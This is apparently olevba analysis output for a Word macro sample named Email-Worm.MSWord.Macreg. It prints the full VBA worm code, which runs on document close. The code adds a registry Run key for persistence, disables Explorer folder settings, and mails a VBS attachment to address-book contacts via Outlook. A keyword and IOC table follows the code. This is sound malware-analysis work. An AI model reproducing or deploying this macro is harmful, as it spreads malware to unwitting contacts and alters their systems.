olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Email-Worm.MSWord.Macreg
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Email-Worm.MSWord.Macreg - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next
Set fs = CreateObject("Scripting.FileSystemObject")
Set dir1 = fs.GetSpecialFolder(0)
Set dir2 = fs.GetSpecialFolder(1)
Set so = CreateObject("Scripting.FileSystemObject")
Dim r
Set r = CreateObject("Wscript.Shell")
r.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\注册表自动备份", "scanregw.exe.vbs"
r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoSetFolders", 1, "REG_DWORD"
Set ol = CreateObject("Outlook.Application")
On Error Resume Next
For x = 1 To 2
Set Mail = ol.CreateItem(0)
Mail.to = ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x)
Mail.Subject = "新年快乐！"
Mail.Body = "新年快乐、祝您好运！            独行者"
Mail.Attachments.Add (dir2 & ("scanregw.exe.vbs"))
Mail.Send
Next
ol.Quit
End Sub

Private Sub Document_New()

End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Wscript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |scanregw.exe        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

